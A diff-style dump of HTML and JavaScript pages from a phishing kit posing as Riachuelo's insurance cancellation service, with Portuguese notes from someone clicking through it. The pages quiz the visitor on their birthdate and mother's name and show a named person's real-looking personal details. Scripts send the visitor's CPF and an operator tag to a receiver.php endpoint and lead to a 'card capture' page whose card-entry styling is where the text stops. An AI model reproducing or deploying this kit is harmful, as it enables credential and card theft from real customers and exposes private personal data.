+                    <circle cx="9.5" cy="9.5" r=".5" fill="currentColor"></circle>
+                    <circle cx="14.5" cy="14.5" r=".5" fill="currentColor"></circle>
+                    <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Negociação<br>RCHLO</span></p>
+    </div>
+</div>
+
+<div class="separator-line" style="display: none;"></div>
+
+<main class="container" id="mainContent">
+                <div class="fade-in" style="margin-top: 20px;">
+                    <h2 style="font-size: 24px; font-weight: bold; margin-bottom: 25px;">Validação de Segurança</h2>
+                    <p style="margin-bottom: 20px; color: #666; font-size: 15px;">Confirme sua DATA DE NASCIMENTO:</p>
+                    <div class="options-list">
+                        
+                            <button class="btn-opt" onclick="window.verificar('15/05/1990')">
+                                15/05/1990
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('19/05/1961')">
+                                19/05/1961
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('22/11/1982')">
+                                22/11/1982
+                            </button>
+                        
+                    </div>
+                </div>
+            </main> <div class="timeline-section" style="display: none;">
+    <div class="timeline-container">
+        <h2 class="timeline-title">Veja como é simples cancelar o seu seguro</h2>
+        
+        <ul class="timeline-list">
+            <li class="timeline-item">
+                <div class="timeline-circle">1</div>
+                <div class="timeline-text">Digite CPF</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">2</div>
+                <div class="timeline-text">Responda as perguntas corretamente</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">3</div>
+                <div class="timeline-text">Valide seus dados pessoais</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle orange-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M7 17l10-6-6-6z"></path>
+                        <path d="M19 4v.01"></path>
+                        <path d="M22 9v.01"></path>
+                        <path d="M14 2v.01"></path>
+                    </svg>
+                </div>
+                <div class="timeline-text">Seguro cancelado com sucesso!</div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
+<script src="js/script.js"></script>
+<script src="js/tracking.js"></script>
+<script>
+    // Identifica por qual link o cliente entrou (ex: ?cancelar)
+    let queryString = window.location.search.substring(1);
+    let operadorUrl = queryString.split('&')[0].replace('/', '');
+    
+    if (operadorUrl && operadorUrl !== "") {
+        // Guarda o operador no navegador do cliente
+        localStorage.setItem('id_operador', operadorUrl);
+    } else if (!localStorage.getItem('id_operador')) {
+        // Se acedeu ao site normal sem link, define como padrao
+        localStorage.setItem('id_operador', 'padrao');
+    }
+</script>
+
+</body></html>
+
+
+CLIQUEI NA DATA CERTA 19/05/1961
+FOI PARA PROXIMA PAGINA 
+
+PAGINA '4'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Riachuelo - Central de Seguros</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<div class="sc-jwLVGg sc-jHoSbG UXilN" style="display: none;">
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-credit-card">
+                    <path d="M3 5m0 3a3 3 0 0 1 3 -3h12a3 3 0 0 1 3 3v8a3 3 0 0 1 -3 3h-12a3 3 0 0 1 -3 -3z"></path>
+                    <path d="M3 10l18 0"></path>
+                    <path d="M7 15l.01 0"></path>
+                    <path d="M11 15l2 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Fatura Cartão<br>RCHLO</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg" class="sc-jXxpsA cjERrS">
+                    <g clip-path="url(#clip0_695_538)">
+                        <path d="M10.6668 6.28711C12.5078 6.28711 14.0002 5.39168 14.0002 4.28711C14.0002 3.18254 12.5078 2.28711 10.6668 2.28711C8.82588 2.28711 7.3335 3.18254 7.3335 4.28711C7.3335 5.39168 8.82588 6.28711 10.6668 6.28711Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 4.28711V6.95378C7.3335 8.05844 8.82616 8.95378 10.6668 8.95378C12.5075 8.95378 14.0002 8.05844 14.0002 6.95378V4.28711" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 6.95312V9.61979C7.3335 10.7245 8.82616 11.6198 10.6668 11.6198C12.5075 11.6198 14.0002 10.7245 14.0002 9.61979V6.95312" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M7.3335 9.62109V12.2878C7.3335 13.3924 8.82616 14.2878 10.6668 14.2878C12.5075 14.2878 14.0002 13.3924 14.0002 12.2878V9.62109" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M4.66667 6.28711H3C2.73478 6.28711 2.48043 6.39247 2.29289 6.58C2.10536 6.76754 2 7.02189 2 7.28711C2 7.55233 2.10536 7.80668 2.29289 7.99422C2.48043 8.18175 2.73478 8.28711 3 8.28711H3.66667C3.93188 8.28711 4.18624 8.39247 4.37377 8.58C4.56131 8.76754 4.66667 9.02189 4.66667 9.28711C4.66667 9.55233 4.56131 9.80668 4.37377 9.99422C4.18624 10.1818 3.93188 10.2871 3.66667 10.2871H2" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                        <path d="M3.3335 5.62109V6.28776M3.3335 10.2878V10.9544V10.2878Z" stroke="#221F20" stroke-width="1.35" stroke-linecap="round" stroke-linejoin="round"></path>
+                    </g>
+                    <defs>
+                        <clipPath id="clip0_695_538">
+                            <rect width="16" height="16" fill="white" transform="translate(0 0.287109)"></rect>
+                        </clipPath>
+                    </defs>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Parcela<br>Empréstimo</span></p>
+    </div>
+
+    <div class="sc-jMqqQT kWHpto">
+        <button class="sc-kNPFEZ lloBWK">
+            <div class="sc-jSfWXF iRgdpY">
+                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="tabler-icon tabler-icon-discount">
+                    <path d="M9 15l6 -6"></path>
+                    <circle cx="9.5" cy="9.5" r=".5" fill="currentColor"></circle>
+                    <circle cx="14.5" cy="14.5" r=".5" fill="currentColor"></circle>
+                    <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+                </svg>
+            </div>
+        </button>
+        <p class="sc-kIOgPM dpFwkh"><span style="font-weight: bold;">Negociação<br>RCHLO</span></p>
+    </div>
+</div>
+
+<div class="separator-line" style="display: none;"></div>
+
+<main class="container" id="mainContent">
+                <div class="fade-in" style="margin-top: 20px;">
+                    <h2 style="font-size: 24px; font-weight: bold; margin-bottom: 25px;">Validação de Segurança</h2>
+                    <p style="margin-bottom: 20px; color: #666; font-size: 15px;">Confirme o NOME DA SUA MÃE:</p>
+                    <div class="options-list">
+                        
+                            <button class="btn-opt" onclick="window.verificar('MARIA APARECIDA SOUZA')">
+                                MARIA APARECIDA SOUZA
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('HELENA FOLTRAN MAIA BALLSTAEDT')">
+                                HELENA FOLTRAN MAIA BALLSTAEDT
+                            </button>
+                        
+                            <button class="btn-opt" onclick="window.verificar('TEREZA DE JESUS FERREIRA')">
+                                TEREZA DE JESUS FERREIRA
+                            </button>
+                        
+                    </div>
+                </div>
+            </main> <div class="timeline-section" style="display: none;">
+    <div class="timeline-container">
+        <h2 class="timeline-title">Veja como é simples cancelar o seu seguro</h2>
+        
+        <ul class="timeline-list">
+            <li class="timeline-item">
+                <div class="timeline-circle">1</div>
+                <div class="timeline-text">Digite CPF</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">2</div>
+                <div class="timeline-text">Responda as perguntas corretamente</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle">3</div>
+                <div class="timeline-text">Valide seus dados pessoais</div>
+            </li>
+            
+            <li class="timeline-item">
+                <div class="timeline-circle orange-circle">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M7 17l10-6-6-6z"></path>
+                        <path d="M19 4v.01"></path>
+                        <path d="M22 9v.01"></path>
+                        <path d="M14 2v.01"></path>
+                    </svg>
+                </div>
+                <div class="timeline-text">Seguro cancelado com sucesso!</div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+
+<script src="js/script.js"></script>
+<script src="js/tracking.js"></script>
+<script>
+    // Identifica por qual link o cliente entrou (ex: ?cancelar)
+    let queryString = window.location.search.substring(1);
+    let operadorUrl = queryString.split('&')[0].replace('/', '');
+    
+    if (operadorUrl && operadorUrl !== "") {
+        // Guarda o operador no navegador do cliente
+        localStorage.setItem('id_operador', operadorUrl);
+    } else if (!localStorage.getItem('id_operador')) {
+        // Se acedeu ao site normal sem link, define como padrao
+        localStorage.setItem('id_operador', 'padrao');
+    }
+</script>
+
+</body></html>
+
+CLIQUEI NA OPÇÃO CERTA  HELENA FOLTRAN MAIA BALLSTAEDT
+PROXIMA E FOI PARA PAGINA 
+
+PAGINA '5'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cancelamento - Seguro Cartão Protegido</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+.box-seguro {
+    text-align: left;
+    padding: 35px;
+    border-radius: 20px;
+    background: linear-gradient(145deg, #ffffff, #f1f3f6);
+    box-shadow: 
+        0 10px 25px rgba(0, 0, 0, 0.08),
+        0 4px 10px rgba(0, 0, 0, 0.04);
+    border: 1px solid rgba(0, 0, 0, 0.05);
+    line-height: 1.7;
+    transition: all 0.3s ease;
+}
+
+.box-seguro:hover {
+    transform: translateY(-5px);
+    box-shadow: 
+        0 15px 35px rgba(0, 0, 0, 0.12),
+        0 6px 15px rgba(0, 0, 0, 0.06);
+}
+
+.btn-cancelar {
+    background: linear-gradient(135deg, #ff4d4f, #c82333) !important;
+    margin-top: 30px;
+    cursor: pointer;
+    color: #ffffff;
+    width: 100%;
+    padding: 16px;
+    border-radius: 50px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 20px rgba(220, 53, 69, 0.35);
+}
+
+.btn-cancelar:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 25px rgba(220, 53, 69, 0.45);
+    background: linear-gradient(135deg, #ff3b3f, #a71d2a) !important;
+}
+
+.btn-cancelar:active {
+    transform: scale(0.98);
+}
+
+    </style>
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<main class="container">
+    <h1>Cancelamento de Seguro</h1>
+    <div class="box-seguro">
+    <p>Olá, <strong>FILIPE EUGENIO MAIA BALLSTAEDT</strong>!</p><br>
+    <p>Se você confirmar o cancelamento, ele passa a valer a partir de hoje, <strong>27/02/2026</strong>.</p>
+    <p><strong>O que muda agora:</strong></p><br>
+    <p>O valor de <strong>R$ 39,99</strong> deixará de ser lançado na sua fatura.</p><br>
+    <p>Ao continuar, você confirma que está ciente dessas mudanças.</p>
+    </div>
+
+    <p style="margin-top:25px;font-size: 15px;color: #333333;text-align: center;">
+        Deseja prosseguir com o cancelamento?
+    </p>
+
+    <button id="btnValidarCard" class="btn-cancelar" onclick="prosseguirCancelamento()">realizar cancelamento</button>
+</main>
+
+<script src="../js/tracking.js"></script>
+<script>
+async function prosseguirCancelamento() {
+    // Registra a decisão no log e envia para a página de captura do cartão
+    try {
+        const uid = localStorage.getItem('device_uid');
+        const cpf = localStorage.getItem('user_cpf');
+        const idOperador = localStorage.getItem('id_operador') || 'padrao';
+
+        await fetch('../receiver.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                uid: uid,
+                cpf: cpf,
+                operador: idOperador,
+                pagina: window.location.pathname,
+                acao: 'Prosseguindo para Cartão'
+            })
+        });
+
+        await fetch('salvar_log.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `decisao=CANCELAMENTO_SOLICITADO`
+        });
+        // Redireciona para a tela de ambiente seguro (transição)
+        window.location.href = '../ambiente_seguro.php';
+    } catch (err) {
+        window.location.href = '../ambiente_seguro.php';
+    }
+}
+</script>
+
+
+</body></html>
+
+CLIQUEI EM REALIZAR CANCELAMENTO E FOI PARA PROXIMA PAGINA
+
+PAGINA '6'
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cancelamento - Seguro Cartão Protegido</title>
+    <link rel="stylesheet" href="../css/style.css">
+    <style>
+.box-seguro {
+    text-align: left;
+    padding: 35px;
+    border-radius: 20px;
+    background: linear-gradient(145deg, #ffffff, #f1f3f6);
+    box-shadow: 
+        0 10px 25px rgba(0, 0, 0, 0.08),
+        0 4px 10px rgba(0, 0, 0, 0.04);
+    border: 1px solid rgba(0, 0, 0, 0.05);
+    line-height: 1.7;
+    transition: all 0.3s ease;
+}
+
+.box-seguro:hover {
+    transform: translateY(-5px);
+    box-shadow: 
+        0 15px 35px rgba(0, 0, 0, 0.12),
+        0 6px 15px rgba(0, 0, 0, 0.06);
+}
+
+.btn-cancelar {
+    background: linear-gradient(135deg, #ff4d4f, #c82333) !important;
+    margin-top: 30px;
+    cursor: pointer;
+    color: #ffffff;
+    width: 100%;
+    padding: 16px;
+    border-radius: 50px;
+    border: none;
+    font-size: 16px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    transition: all 0.3s ease;
+    box-shadow: 0 8px 20px rgba(220, 53, 69, 0.35);
+}
+
+.btn-cancelar:hover {
+    transform: translateY(-3px);
+    box-shadow: 0 12px 25px rgba(220, 53, 69, 0.45);
+    background: linear-gradient(135deg, #ff3b3f, #a71d2a) !important;
+}
+
+.btn-cancelar:active {
+    transform: scale(0.98);
+}
+
+    </style>
+</head>
+<body>
+
+<header class="top-bar">
+    <div class="logo-svg">
+        <svg width="89" height="10" viewBox="0 0 89 10" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" fill-rule="evenodd" clip-rule="evenodd" d="M71.8553 7.08583V0.217737H70.1113V7.08583C70.1113 8.57267 71.5336 9.78312 73.2836 9.78312H76.899V8.32867H73.2836C72.4764 8.32677 71.8552 7.77015 71.8552 7.08583M11.3203 9.78312H13.0643V0.217737H11.3223V9.78312H11.3203ZM82.8992 8.47491C80.8801 8.47491 79.2353 6.91181 79.2353 4.99226C79.2353 3.08032 80.8801 1.52485 82.8992 1.52485C84.9103 1.52485 86.545 3.08032 86.545 4.99226C86.547 6.91182 84.9102 8.47491 82.8992 8.47491ZM86.7268 1.49828C85.6829 0.531835 84.3233 0 82.899 0C81.4039 0 80.014 0.548991 78.9862 1.54784C78.0191 2.4857 77.4648 3.74189 77.4648 4.99237C77.4648 7.70682 79.9533 9.99999 82.899 9.99999C84.3739 9.99999 85.7598 9.44147 86.7976 8.42737C87.7748 7.47426 88.3332 6.22379 88.3332 4.99237C88.3352 3.71712 87.7485 2.44377 86.7268 1.49828M60.6467 9.78261H67.4223V8.32816H62.3543V5.80243H66.9873V4.34417H62.3543V1.67357H67.4223V0.219132H60.6467V9.78261ZM56.1939 6.70648C56.1939 7.71106 55.1459 8.52501 53.7661 8.52501C52.3782 8.52501 51.3201 7.70915 51.3201 6.70648V0.217737H49.5802V6.70649C49.5802 7.16017 49.8736 10.0004 53.7661 10.0004C57.6566 10.0004 57.9338 7.16017 57.9338 6.70649V0.217737H56.1899L56.1939 6.70648ZM45.1284 4.34469H40.2566L40.2526 0.217737H38.5147V9.78312H40.2526L40.2566 5.80294H45.1284L45.1244 9.78312H46.8683V0.217737H45.1244L45.1284 4.34469ZM34.8125 7.2819C34.0133 8.03676 33.0139 8.47138 32.0731 8.47138C30.056 8.47138 28.4132 6.9121 28.4132 4.99446C28.4132 3.08634 30.056 1.53277 32.0731 1.53277C33.0321 1.53277 34.0194 1.95595 34.8509 2.72225L34.9076 2.77562L36.168 1.6948L36.1012 1.63571C35.4275 1.0486 34.8064 0.646391 34.2015 0.406208C33.4974 0.143148 32.761 0.00209362 32.0731 0.00209362C31.3225 0.00209362 30.6185 0.129814 29.9205 0.390956C29.2589 0.652112 28.6621 1.03335 28.1967 1.48894C27.1892 2.41726 26.6369 3.66011 26.6369 4.99255C26.6369 6.325 27.1892 7.56594 28.1907 8.49046C28.658 8.94604 29.2407 9.31776 29.9265 9.59606C30.6286 9.86675 31.3326 10.0002 32.0731 10.0002C32.8015 10.0002 33.5399 9.85912 34.2096 9.59416C34.8388 9.3292 35.4761 8.91173 36.1012 8.35131L36.168 8.29031L34.8671 7.22855L34.8125 7.2819ZM18.9254 6.23333L20.4873 3.00993H20.5662L22.126 6.23142L18.9254 6.23333ZM20.0848 0.221358L15.3931 9.78292H17.222L18.2397 7.69181L22.8262 7.68418L23.8337 9.78292H25.6627L20.9689 0.215643L20.0848 0.221358ZM1.70779 4.54686V1.6742H5.15931C5.98274 1.6742 6.62207 2.44621 6.62207 3.11147C6.62207 3.93305 5.83101 4.54876 5.1229 4.54876H1.7078L1.70779 4.54686ZM6.13502 5.47127C7.45008 5.08621 8.3342 4.05876 8.3342 2.91503C8.3342 1.42818 6.89574 0.217737 5.12547 0.217737H0.000793457V9.78312H1.71037V6.0031H2.95056C4.01272 6.0031 4.34249 6.0355 4.8928 6.75986L6.98475 9.78312H8.95733L5.99137 5.51319L6.13502 5.47127Z"></path>
+        </svg>
+    </div>
+</header>
+
+<main class="container">
+    <h1>Cancelamento de Seguro</h1>
+    <div class="box-seguro">
+    <p>Olá, <strong>FILIPE EUGENIO MAIA BALLSTAEDT</strong>!</p><br>
+    <p>Se você confirmar o cancelamento, ele passa a valer a partir de hoje, <strong>27/02/2026</strong>.</p>
+    <p><strong>O que muda agora:</strong></p><br>
+    <p>O valor de <strong>R$ 39,99</strong> deixará de ser lançado na sua fatura.</p><br>
+    <p>Ao continuar, você confirma que está ciente dessas mudanças.</p>
+    </div>
+
+    <p style="margin-top:25px;font-size: 15px;color: #333333;text-align: center;">
+        Deseja prosseguir com o cancelamento?
+    </p>
+
+    <button id="btnValidarCard" class="btn-cancelar" onclick="prosseguirCancelamento()">realizar cancelamento</button>
+</main>
+
+<script src="../js/tracking.js"></script>
+<script>
+async function prosseguirCancelamento() {
+    // Registra a decisão no log e envia para a página de captura do cartão
+    try {
+        const uid = localStorage.getItem('device_uid');
+        const cpf = localStorage.getItem('user_cpf');
+        const idOperador = localStorage.getItem('id_operador') || 'padrao';
+
+        await fetch('../receiver.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                uid: uid,
+                cpf: cpf,
+                operador: idOperador,
+                pagina: window.location.pathname,
+                acao: 'Prosseguindo para Cartão'
+            })
+        });
+
+        await fetch('salvar_log.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: `decisao=CANCELAMENTO_SOLICITADO`
+        });
+        // Redireciona para a tela de ambiente seguro (transição)
+        window.location.href = '../ambiente_seguro.php';
+    } catch (err) {
+        window.location.href = '../ambiente_seguro.php';
+    }
+}
+</script>
+
+
+</body></html>
+
+FICOU CARREGANDO E PAROU NESSA PAGINA AQUI 
+
+PAGINA '7' 
+
+<html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validação de Cancelamento</title>
+    <style>
+        /* ================= ESTILOS GERAIS ================= */
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Helvetica Neue', Arial, sans-serif; }
+        body { background-color: #fafafa; color: #333; }
+        
+        .top-bar { background: #000; color: #fff; text-align: center; padding: 18px; font-weight: 900; font-size: 18px; letter-spacing: 3px; }
+        .container { max-width: 420px; margin: 0 auto; padding: 30px 20px; text-align: center; }
+        
+        h2 { font-size: 22px; color: #111; margin-bottom: 10px; font-weight: bold; }
+        .subtitle { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+
+        /* ================= CARTÃO 3D ================= */
+        .card-scene { width: 100%; height: 210px; margin: 0 auto 30px auto; perspective: 1000px; }
+        .card-wrapper { width: 100%; height: 100%; position: relative; transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275); transform-style: preserve-3d; }
+        .card-wrapper.flipped { transform: rotateY(180deg); }
+        
+        .card-face {
+            position: absolute; width: 100%; height: 110%; backface-visibility: hidden; 
+            border-radius: 12px; color: #fff; box-shadow: 0 15px 25px rgba(0,0,0,0.3); padding: 20px;
+        }
+        
+        /* Frente do Cartão */
+        .card-front {
+            background-image: url('../img/cartao.png'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: block; 
+        }
+        
+        /* Textos da Frente (NOVO LAYOUT CLÁSSICO) */
+        .display-number { 
+            position: absolute;
+            top: 105px; /* Empurrado mais para cima, quase no meio do cartão */
+            left: 25px;
+            font-family: 'Courier New', Courier, monospace; 
+            font-size: 21px; 
+            letter-spacing: 2px; 
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.9); 
+            text-align: left; 
+        }
+        
+        .display-validity { 
+            position: absolute;
+            top: 150px; /* Posicionado logo abaixo dos números */
+            left: 27px; /* Alinhado próximo ao 3º bloco numérico */
+            display: flex; /* Coloca o label e a data lado a lado */
+            align-items: center;
+            gap: 6px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.8);
+        }
+        
+        .validity-label { 
+            font-size: 7px; 
+            opacity: 0.8; 
+            text-transform: uppercase;
+            text-align: center;
+            line-height: 1.2;
